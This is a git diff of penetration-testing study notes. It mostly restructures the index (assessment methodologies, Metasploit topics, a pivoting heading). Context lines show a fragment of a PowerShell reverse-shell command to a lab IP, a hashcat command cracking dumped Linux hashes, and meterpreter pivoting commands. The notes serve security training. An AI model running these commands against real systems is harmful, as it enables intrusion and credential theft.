@@ -1,14 +1,29 @@
 # Index
+- [SECTION 1 Assessment Methodologies](#SECTION-1-Assessment-Methodologies)
+	- Information Gathering
+ 	- Footprinting and Scanning
+  - Enumeration
+  - Vulnerability Assessment
+
 - [SECTION 3 Host and Network Penetration Testing](#SECTION-3-Host-and-Network-Penetration-Testing)
-  - System and Host Based Attacks
-  - [Network-Based Attacks](#Network-Based-Attacks)
-  - The Metasploit Framework (MSF)
-  - [Exploitation](#Exploitation)
-  - [Post-Exploitation](#Post-Exploitation)
-  - Social Engineering
+	- System and Host Based Attacks
+	- [Network-Based Attacks](#Network-Based-Attacks)
+	- The Metasploit Framework (MSF)
+	- [Exploitation](#Exploitation)
+	- [Post-Exploitation](#Post-Exploitation)
+	- Social Engineering
+
+# SECTION 1 Assessment Methodologies
+## Information Gathering
+
+## Footprinting and Scanning
+
+## Enumeration
+
+## Vulnerability Assessment
+- NULL
 
 # SECTION 3 Host and Network Penetration Testing
-
 ## System and Host Based Attacks
 
 ## Network-Based Attacks
@@ -31,6 +46,19 @@ sudo wireshark -i eth1 -k
 ```
 
 ## The Metasploit Framework (MSF)
+- [Metasploit Fundamentals](#Metasploit-Fundamentals)
+- [Nmap](#Nmap)
+- [Enumeration](#Enumeration)
+- MSF
+- Web Apps
+- Payloads
+- Automating
+- Windows Exploitation
+- Linux Exploitation
+- Post Exploitation Fundamentals
+- Windows Post Exploitation
+- Linux Post Exploitation
+- Metasploit GUIs
 
 ## Exploitation
 - [Vulnerability Scanning](#Vulnerability-Scanning)
@@ -265,7 +293,7 @@ Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.
 - [Linux Persistence](#Linux-Persistence)
 - [Dumping and Cracking Windows Hashes](#Dumping-and-Cracking-Windows-Hashes)
 - [Dumping and Cracking Linux Hashes](#Dumping-and-Cracking-Linux-Hashes)
-- [Pivoting](#Pivoting)
+- [Pivoting Overview](#Pivoting-Overview)
 - [Clearing Your Tracks](#Clearing-Your-Tracks)
 - [Keylogging](#Keylogging)
 
@@ -769,7 +797,7 @@ hashcat -m 1800 -a 3 /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.
 cat .hashcat/hashcat.potfile
 ```
 
-### Pivoting
+### Pivoting Overview
 ```
 meterpreter > ipconfig
 meterpreter > arp
